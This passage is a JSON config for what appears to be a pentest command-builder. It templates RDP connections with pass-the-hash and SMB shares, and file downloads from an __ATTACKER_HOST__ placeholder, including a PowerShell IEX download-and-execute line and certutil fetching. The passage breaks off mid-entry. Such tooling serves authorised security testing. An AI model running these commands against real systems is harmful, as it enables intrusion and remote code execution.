[
  {
    "id": "rdp-client",
    "keywords": ["rdp", "xfreerdp", "rdesktop", "3389"],
    "cmds": [
      {
        "win": 0,
        "label": "XfreeRDP",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "xfreerdp /timeout:__XFREERDP_TIMEOUT_SEC__000 /cert-ignore /compression /clipboard /dynamic-resolution /w:__RDP_WINDOW_WIDTH__ /h:__RDP_WINDOW_HEIGHT__ /port:__RDP_TARGET_PORT__ /v:'__RDP_TARGET_HOST__' __XFREERDP_DOMAIN_AUTH__ /u:'__USERNAME__' __XFREERDP_PASSWORD_AUTH__ __XFREERDP_SMB_SHARE_ENABLED__ __XFREERDP_ADMIN__ __XFREERDP_PROXY__",
        "help": "# XfreeRdp - Remote Desktop Client\n\nRDP is a common protocol available, especially inside a network which contains Windows computers. However RDP can be running on any OS.\n\nBuilding the xfreerdp command here gives guidance on the options that work for various scenarios, including locally authenticating to a Windows PC vs domain authentication to a Windows PC. There are also advanced features which xfreerdp seamlessly integrates such as enabling a way to share a local folder from Linux to the RDP target.",
        "code": [],
        "config": [
          {
            "help": "Set the RDP Port to connect on, default 3389",
            "replace": "__RDP_TARGET_PORT__",
            "defaultValue": 3389,
            "props": {
              "type": "number",
              "label": "RDP Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          },
          {
            "help": "Enable the DOMAIN flag to specify which DOMAIN for authentication",
            "replace": "__XFREERDP_DOMAIN_AUTH__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable DOMAIN auth",
              "replaceValue": "/d:'__DOMAIN__'"
            }
          },
          {
            "help": "Select password authentication (plaintext creds or NTLM password hash aka pass-the-hash)",
            "replace": "__XFREERDP_PASSWORD_AUTH__",
            "defaultValue": "/p:'__PASSWORD__'",
            "props": {
              "type": "radio",
              "label": "Select password auth method",
              "options": [
                {
                  "replace": "/p:'__PASSWORD__'",
                  "label": "Enable password authentication"
                },
                {
                  "replace": "/pth:'__NTLM_PASSWORD_HASH__'",
                  "label": "Enable pass-the-hash authentication"
                }
              ]
            }
          },
          {
            "help": "This enables an SMB share to be available within the RDP session (available to the target aka RDP server machine). This shares a folder on Linux to the target. Share name is set to `share`\n\nDefault is to share the current working directory aka `.`",
            "replace": "__XFREERDP_SMB_SHARE_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable SMB Share in RDP session",
              "replaceValue": "/drive:share,__SMB_SHARE_LOCAL_PATH__"
            }
          },
          {
            "help": "XfreeRDP can share a local folder (local to the RDP client machine aka local to the machine connecting to the RDP server aka local to the attacking machine, kali). This SMB share will be available while the RDP session is connected. This allows for quick and easy upload/download of data (from the RDP server to kali) while in the RDP session without a complicated setup. Default is to include the current working directory (. period). Alternatively supply a path to another folder to share.",
            "replace": "__SMB_SHARE_LOCAL_PATH__",
            "defaultValue": ".",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "SMB Shared directory path (on Kali)"
            }
          },
          {
            "help": "Enable the 'admin' (or console) session. Documentation is sparse on this option, fyi.",
            "replace": "__XFREERDP_ADMIN__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable /admin (or console) session",
              "replaceValue": "/admin"
            }
          },
          {
            "help": "Enter the number of seconds for the timeout value. This will kill the RDP connection if the RDP server fails to respond in this amount of time; useful for 'high latency' links eg when using through a proxy or on slow internet.\n\n> NOTE: this is automatically converted to milliseconds, which is what the flag requires for the command.\n\nThe `min` and `max` values were picked to be somewhat sane values. Make a PR on GitHub if these are not valid for your scenario to keep this tool as useful as possible.",
            "replace": "__XFREERDP_TIMEOUT_SEC__",
            "defaultValue": 60,
            "props": {
              "type": "number",
              "label": "Timeout in Seconds",
              "InputProps": {
                "inputProps": {
                  "min": 5,
                  "max": 60
                }
              }
            }
          },
          {
            "help": "This is the width of the RDP client window (on Linux).\n\nCommon values are:\n\n```\n1280\n1440\n1920\n2048\n3840\n```",
            "replace": "__RDP_WINDOW_WIDTH__",
            "defaultValue": 1280,
            "props": {
              "type": "number",
              "label": "Window Width in pixels",
              "InputProps": {
                "inputProps": {
                  "min": 320,
                  "max": 4000
                }
              }
            }
          },
          {
            "help": "The RDP client window height (on Linux) in pixels.\n\n> NOTE: Most values are slightly less than the typical value for the resolution. This can help account for the menu bar height.\n\nCommon values:\n\n```bash\n700\n# for both 1080p and 2k\n1050\n2120\n```",
            "replace": "__RDP_WINDOW_HEIGHT__",
            "defaultValue": 700,
            "props": {
              "type": "number",
              "label": "Window Height in pixels ",
              "InputProps": {
                "inputProps": {
                  "min": 240,
                  "max": 2160
                }
              }
            }
          },
          {
            "help": "Either tweak the IPv4 Victim (target) address in the top toolbar OR enter a custom hostname here.",
            "replace": "__RDP_TARGET_HOST__",
            "defaultValue": "__TARGET_HOST__",
            "props": {
              "type": "select",
              "label": "RDP Target Host or IPv4",
              "customInput": true,
              "options": ["__TARGET_HOST__"]
            }
          },
          {
            "help": "Enable use of a proxy for the RDP connection to connect via (/proxy:[<proto>://][<user>:<password>@]<host>:<port>). NOTE: DO NOT USE WITH PROXYCHAINS",
            "replace": "__XFREERDP_PROXY__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable proxy flags",
              "replaceValue": "/proxy:'__XFREERDP_PROXY_PROTO__://__XFREERDP_PROXY_AUTH_ENABLED____XFREERDP_PROXY_HOST__:__XFREERDP_PROXY_PORT__'"
            }
          },
          {
            "help": "Select the proxy protocol to utilize, xfreerdp default is http",
            "replace": "__XFREERDP_PROXY_PROTO__",
            "defaultValue": "http",
            "props": {
              "type": "select",
              "label": "Proxy Protocol",
              "customInput": false,
              "options": ["http", "socks5"]
            }
          },
          {
            "help": "If your Proxy has BASIC authentication, enable this checkbox to enter the Proxy username and password. Most proxies do not require authentication, so this will most likely remain unchecked in most scenarios.",
            "replace": "__XFREERDP_PROXY_AUTH_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable BASIC auth for Proxy",
              "replaceValue": "__XFREERDP_PROXY_AUTH__"
            }
          },
          {
            "help": "Proxy BASIC authentication. Format is 'USERNAME:PASSWORD@' (separate username and password with colon ending with an @). Default is blank",
            "replace": "__XFREERDP_PROXY_AUTH__",
            "defaultValue": "USERNAME:PASSWORD@",
            "validationRegex": "^[^:@]+:[^@]+@$",
            "validationHelp": "Format: USERNAME:PASSWORD@",
            "props": {
              "type": "string",
              "label": "Proxy Auth"
            }
          },
          {
            "help": "Proxy hostname or ipv4. default localhost",
            "replace": "__XFREERDP_PROXY_HOST__",
            "defaultValue": "localhost",
            "props": {
              "type": "string",
              "label": "Proxy Hostname or IPv4"
            }
          },
          {
            "help": "Proxy port. Default 1080",
            "replace": "__XFREERDP_PROXY_PORT__",
            "defaultValue": 1080,
            "props": {
              "type": "number",
              "label": "Proxy Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "Rdesktop",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "__RDESKTOP_IGNORE_CERTS_ENABLED__rdesktop __RDESKTOP_COMPRESSION_ENABLED__ __RDESKTOP_KEEP_KEYBINDING_ENABLED__ -g __RDP_WINDOW_WIDTH__x__RDP_WINDOW_HEIGHT__ -r clipboard:__RDESKTOP_CLIPBOARD__ __RDESKTOP_SMB_SHARE_ENABLED__ __RDESKTOP_DOMAIN_AUTH__ -u '__USERNAME__' -p '__PASSWORD__' '__RDP_TARGET_HOST__:__RDP_TARGET_PORT__'",
        "help": "# Rdesktop\n\nThis is an alternative RDP client for Linux. It's recommended to use Xfreerdp over this tool as Xfreerdp has more options (eg pass-the-hash, cert ignore, etc) and is fairly stable to use.",
        "code": [],
        "config": [
          {
            "help": "Set the RDP Port to connect on, default 3389",
            "replace": "__RDP_TARGET_PORT__",
            "defaultValue": 3389,
            "props": {
              "type": "number",
              "label": "RDP Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          },
          {
            "help": "Rdesktop can share a local folder (local to the RDP client machine aka local to the machine connecting to the RDP server aka local to the attacking machine, kali). This SMB share will be available while the RDP session is connected. This allows for quick and easy upload/download of data (from the RDP server to kali) while in the RDP session without a complicated setup. Default is to include the current working directory (. period). Alternatively supply a path to another folder to share.",
            "replace": "__SMB_SHARE_LOCAL_PATH__",
            "defaultValue": ".",
            "validationRegex": "",
            "validationHelp": "",
            "props": {
              "type": "string",
              "label": "SMB Shared directory path (on Kali)"
            }
          },
          {
            "help": "Rdesktop does not include a flag to ignore certificate related errors. As such, it will prompt you with a yes/no question when a new cert is found that needs to be trusted. Enabling this option will add some linux foo to pipe 'yes' as input to the rdesktop command which will accept any prompt with a yes/no question.\n\n> WARNING: This doesn't know if the prompt being asked is a certificate error prompt and will insert 'yes' into any prompt asked. Use at your own risk.",
            "replace": "__RDESKTOP_IGNORE_CERTS_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable auto-accept certificate errors",
              "replaceValue": "echo 'yes' | "
            }
          },
          {
            "help": "Enable the DOMAIN flag to specify which DOMAIN for authentication",
            "replace": "__RDESKTOP_DOMAIN_AUTH__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable DOMAIN auth",
              "replaceValue": "-d '__DOMAIN__'"
            }
          },
          {
            "help": "Enable compression to save bandwidth and potentially reduce lag",
            "replace": "__RDESKTOP_COMPRESSION_ENABLED__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable compression",
              "replaceValue": "-z"
            }
          },
          {
            "help": "> WARNING: Rdesktop documentation seems lacking on what these options are, so this is a best-guess help\n\n`off` means no clipboard synchronization aka no copy/paste between RDP server and client (either direction)\n\n`CLIPBOARD` presumably means that the RDP Client (aka Linux) can copy/paste with the RDP server. This is the default suggestion\n\n`PRIMARYCLIPBOARD` appears to be for older systems and will likely be buggy in modern environments. It's also claimed that cut will not work properly with this setting.",
            "replace": "__RDESKTOP_CLIPBOARD__",
            "defaultValue": "CLIPBOARD",
            "props": {
              "type": "select",
              "label": "Clipboard setting",
              "customInput": false,
              "options": ["off", "PRIMARYCLIPBOARD", "CLIPBOARD"]
            }
          },
          {
            "help": "This enables an SMB share to be available within the RDP session (available to the target aka RDP server machine). This shares a folder on Linux to the target. Share name is set to `share`\n\nDefault is to share the current working directory aka `.`",
            "replace": "__RDESKTOP_SMB_SHARE_ENABLED__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable SMB share in RDP session",
              "replaceValue": "-r disk:share='__SMB_SHARE_LOCAL_PATH__'"
            }
          },
          {
            "help": "Either tweak the IPv4 Victim (target) address in the top toolbar OR enter a custom hostname here.",
            "replace": "__RDP_TARGET_HOST__",
            "defaultValue": "__TARGET_HOST__",
            "props": {
              "type": "select",
              "label": "RDP Target Hostname or IPv4",
              "customInput": true,
              "options": ["__TARGET_HOST__"]
            }
          },
          {
            "help": "Enable this option to stop the RDP session from overriding the window manager key bindings. By default rdesktop attempts to grab all keyboard input when it is in focus.\n\n> Assumption: This likely means that you could `alt + tab` out of an Rdesktop session, tho it's unclear from the docs how this feature exactly works.",
            "replace": "__RDESKTOP_KEEP_KEYBINDING_ENABLED__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Keep Window Manager Keybindings",
              "replaceValue": "-K"
            }
          },
          {
            "help": "This is the width of the RDP client window (on Linux).\n\nCommon values are:\n\n```\n1280\n1440\n1920\n2048\n3840\n```",
            "replace": "__RDP_WINDOW_WIDTH__",
            "defaultValue": 1280,
            "props": {
              "type": "number",
              "label": "Window Width in pixels",
              "InputProps": {
                "inputProps": {
                  "min": 320,
                  "max": 4000
                }
              }
            }
          },
          {
            "help": "The RDP client window height (on Linux) in pixels.\n\n> NOTE: Most values are slightly less than the typical value for the resolution. This can help account for the menu bar height.\n\nCommon values:\n\n```bash\n700\n# for both 1080p and 2k\n1050\n2120\n```",
            "replace": "__RDP_WINDOW_HEIGHT__",
            "defaultValue": 700,
            "props": {
              "type": "number",
              "label": "Window Height in pixels ",
              "InputProps": {
                "inputProps": {
                  "min": 240,
                  "max": 2160
                }
              }
            }
          }
        ]
      }
    ]
  },
  {
    "id": "http-download",
    "keywords": [
      "download",
      "http",
      "curl",
      "wget",
      "iwr",
      "get",
      "80",
      "8080",
      "certutil"
    ],
    "cmds": [
      {
        "win": 0,
        "label": "Powershell HTTP Requests",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": false,
        "cmd": "__PS_HTTP_REQUEST__",
        "help": "",
        "code": [],
        "config": [
          {
            "help": "There are many ways to use PowerShell cmdlets to accomplish HTTP Get requests and download files. This attempts to enumerate common options",
            "replace": "__PS_HTTP_REQUEST__",
            "defaultValue": "iwr http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -outfile __FILE__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "iwr http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -outfile __FILE__",
                  "label": "Invoke-WebRequest (iwr) HTTP GET save to file"
                },
                {
                  "replace": "IEX(New-Object System.Net.WebClient).DownloadString('http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__')",
                  "label": "Invoke-Expression (iex + download)"
                },
                {
                  "replace": "(New-Object System.Net.WebClient).DownloadFile(\"http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__\",\"__FILE__\")",
                  "label": "Ps V2.0 System.Net.WebClient.DownloadFile"
                }
              ],
              "label": "Select an option"
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "Downloading Files on Linux",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "__LINUX_HTTP_DL__",
        "help": "",
        "code": [],
        "config": [
          {
            "help": "Set the curl timeout in seconds before the command will stop and return back to the terminal, irrespective if the download was finished or not. Default is around 120 seconds.",
            "replace": "__TIMEOUT_SEC__",
            "defaultValue": 10,
            "props": {
              "type": "number",
              "label": "Timeout Seconds",
              "InputProps": {
                "inputProps": {
                  "min": 0,
                  "max": 300
                }
              }
            }
          },
          {
            "help": "Enter any extra flags for this CURL command, default blank (none)",
            "replace": "__EXTRA_CURL_LINUX_FLAGS__",
            "defaultValue": "",
            "props": {
              "type": "string",
              "label": "Extra Curl Flags"
            }
          },
          {
            "help": "",
            "replace": "__LINUX_HTTP_DL__",
            "defaultValue": "curl __EXTRA_CURL_LINUX_FLAGS__ -m __TIMEOUT_SEC__ -L http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -o __FILE__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "curl __EXTRA_CURL_LINUX_FLAGS__ -m __TIMEOUT_SEC__ -L http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -o __FILE__",
                  "label": "curl"
                },
                {
                  "replace": "wget --timeout=__TIMEOUT_SEC__ http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ -O __FILE__",
                  "label": "wget"
                }
              ],
              "label": "Select an option"
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "Download files on Windows",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "__WINDOWS_HTTP_DL__",
        "help": "",
        "code": [],
        "config": [
          {
            "help": "",
            "replace": "__WINDOWS_HTTP_DL__",
            "defaultValue": "certutil.exe -urlcache -split -f __ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ __FILE__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "certutil.exe -urlcache -split -f __ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__ __FILE__",
                  "label": "certutil.exe"
                },
                {
                  "replace": "curl -OL http://__ATTACKER_HOST__:__CUSTOM_HTTP_SERVER_PORT__/__PATH__/__FILE__",
                  "label": "curl (default installed on Win10 and Win11)"
                }
              ],
              "label": "Select an option"
            }
          }
        ]
      },
      {
        "win": 1,
        "label": "HTTP Server setup",
        "platform": "linux|windows",
        "terminal": ["ps", "cmd", "sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "__HTTP_SERVER_CMD__",
        "help": "Setup an http server quickly to serve any tools, exploits or other files necessary for the pentest.\n\n> NOTE: the folder and files suggested were collected when setting up this web app. This info is stored in the `src/assets/dirtree.json` file",
        "code": [
          {
            "data": "aW1wb3J0IGh0dHAuc2VydmVyCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBwYXJzZV9xcywgdXJscGFyc2UKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBvcy5wYXRoCiMgaW1wb3J0IGpzb24KCmRlZiBtYWluKFBPUlQpOgogICAgY2xhc3MgQ3VzdG9tSFRUUFJlcXVlc3RIYW5kbGVyKGh0dHAuc2VydmVyLlNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlcik6CiAgICAgICAgCiAgICAgICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICAgICAgIyBEZWJ1ZyB0aGUgR0VUIHJlcXVlc3QgcGFyYW1ldGVycwogICAgICAgICAgICBwYXJzZWRfdXJsID0gdXJscGFyc2Uoc2VsZi5wYXRoKQogICAgICAgICAgICBwYXJhbWV0ZXJzID0gcGFyc2VfcXMocGFyc2VkX3VybC5xdWVyeSkKICAgICAgICAgICAgcHJpbnQoIj09PUdFVD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3BhcnNlZF91cmwucGF0aH1cblBhcmFtZXRlcnM6IHtwYXJzZWRfdXJsLnF1ZXJ5fSIpCgogICAgICAgICAgICByZXF1ZXN0ZWRfcGF0aCA9IHNlbGYudHJhbnNsYXRlX3BhdGgoc2VsZi5wYXRoKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhyZXF1ZXN0ZWRfcGF0aCk6CiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXUiLCAibm9ybWFsIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXQiLCAiNjAwMCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9kb2N1bWVudC1zYXZlLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIyMDAgLSBGaWxlIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsibm90aWZ5LXNlbmQiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdSIsICJub3JtYWwiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnLWknLCAiL3Vzci9zaGFyZS9pY29ucy9nbm9tZS80OHg0OC9hY3Rpb25zL3Byb2Nlc3Mtc3RvcC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYiR0VUIHtwYXJzZWRfdXJsLnBhdGh9IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiNDA0IC0gTk9UIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKCiAgICAgICAgICAgICMgSWYgdGhlIGZpbGUgZXhpc3RzIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeSwgc2VydmUgaXQsIG90aGVyd2lzZSBzZW5kIGEgNDA0LgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzdXBlcigpLmRvX0dFVCgpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KGYiZXJyb3IgZW5jb3VudGVyZWQgd2hpbGUgc2VydmluZzoge3BhcnNlZF91cmwucGF0aH0iKQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJub3RpZnktc2VuZCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi10IiwgIjYwMDAiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICctaScsICIvdXNyL3NoYXJlL2ljb25zL2dub21lLzQ4eDQ4L2FjdGlvbnMvcHJvY2Vzcy1zdG9wLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICI1MDAgLSBJbnRlcm5hbCBFcnJvciIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0pCgogICAgICAgIGRlZiBkb19QT1NUKHNlbGYpOgogICAgICAgICAgICAjIGZvciBmaWxlIHVwbG9hZHMsIGV4cGVjdCBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0gYW5kIC91cGxvYWQgcm91dGUKICAgICAgICAgICAgaWYgc2VsZi5wYXRoLmxvd2VyKCkgPT0gJy91cGxvYWQnOgogICAgICAgICAgICAgICAgcHJpbnQoJ2ZpbGUgdXBsb2FkJykKCiAgICAgICAgICAgICAgICBjb250ZW50X2xlbmd0aCA9IGludChzZWxmLmhlYWRlcnNbJ0NvbnRlbnQtTGVuZ3RoJ10pCiAgICAgICAgICAgICAgICBib2R5ID0gc2VsZi5yZmlsZS5yZWFkKGNvbnRlbnRfbGVuZ3RoKQoKICAgICAgICAgICAgICAgICMgVE9ETzogcmFuZG9taXplIHRoaXMgZmlsZW5hbWUgaW4gdGhlIHRtcC8gZm9sZGVyCiAgICAgICAgICAgICAgICAjIFRPRE86IGVuc3VyZSB0aGUgdG1wIGZvbGRlciBleGlzdHMgd2hlbiBzdGFydGluZyB0aGlzIHNjcmlwdAogICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gJ3RtcC91cGxvYWQxLmZpbGUnCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAnd2InKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoYm9keSkKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQnKQoKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAjIGZvciBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQgb3IgbXVsdGlwYXJ0L2Zvcm0tZGF0YSBhdCBhbnkgcm91dGU6CiAgICAgICAgICAgICAgICAjIERlYnVnIHRoZSBQT1NUIHJlcXVlc3QgYm9keQogICAgICAgICAgICAgICAgY29udGVudF9sZW5ndGggPSBpbnQoc2VsZi5oZWFkZXJzLmdldCgnQ29udGVudC1MZW5ndGgnKSkKICAgICAgICAgICAgICAgIHBvc3RfZGF0YSA9IHNlbGYucmZpbGUucmVhZChjb250ZW50X2xlbmd0aCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMgQXNzdW1pbmcgUE9TVCBkYXRhIGlzIHNlbnQgYXMgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcgb3IgJ211bHRpcGFydC9mb3JtLWRhdGEnCiAgICAgICAgICAgICAgICAjcG9zdF92YXJzID0gcGFyc2VfcXMocG9zdF9kYXRhLmRlY29kZSgndXRmLTgnKSwga2VlcF9ibGFua192YWx1ZXM9VHJ1ZSkKICAgICAgICAgICAgICAgIHByaW50KCI9PT1QT1NUPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgICAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3NlbGYucGF0aH1cbkJvZHk6IHtwb3N0X2RhdGF9IikKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgICMgUHJvdmlkZSBhIHJlc3BvbnNlIHRvIHRoZSBjbGllbnQKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQgYW5kIGxvZ2dlZC4nKQoKICAgIHdpdGggaHR0cC5zZXJ2ZXIuSFRUUFNlcnZlcigoJycsIFBPUlQpLCBDdXN0b21IVFRQUmVxdWVzdEhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KGYiU2VydmluZyBhdCBwb3J0IHtQT1JUfSIpCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IlN0YXJ0IGFuIEhUVFAgc2VydmVyIG9uIGEgc3BlY2lmaWMgcG9ydC4iKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgncG9ydCcsIHR5cGU9aW50LCBoZWxwPSJQb3J0IHRvIHN0YXJ0IHRoZSBIVFRQIHNlcnZlciBvbiIpCiAgICBhcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQoKICAgIHRyeToKICAgICAgICBtYWluKGFyZ3MucG9ydCkKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5DbG9zaW5nIHNlcnZlci4uLiIpCgo=",
            "filename": "custom_server.py",
            "sha256": "0373a699442f2b49399d92455a5c7ff605d653d9b8e01750d2781dede0932d02"
          }
        ],
        "config": [
          {
            "help": "Set the HTTP server port",
            "replace": "__CUSTOM_HTTP_SERVER_PORT__",
            "defaultValue": 8081,
            "props": {
              "type": "number",
              "label": "Custom HTTP Port",
              "InputProps": {
                "inputProps": {
                  "min": 1,
                  "max": 65535
                }
              }
            }
          },
          {
            "help": "On some systems the Python binary is differentiated from Python version 2 by naming it python3. This adds the 3 to the command string for you",
            "replace": "__PYTHON_BIN_3__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Python binary is named Python3",
              "replaceValue": "3"
            }
          },
          {
            "help": "Default is to host the webserver on all interfaces. There are times when it might be useful to only host it on a given interface and/or address. This option enables the flag to this.",
            "replace": "__ENABLE_HTTP_SERVER_BIND_TO_ADDRESS__",
            "defaultValue": false,
            "props": {
              "type": "checkbox",
              "label": "Enable bind to specific ipv4 address",
              "replaceValue": "--bind __CUSTOM_HTTP_SERVER_BIND_ADDRESS__"
            }
          },
          {
            "help": "Enter the IPv4 Address to bind the python simple http server to",
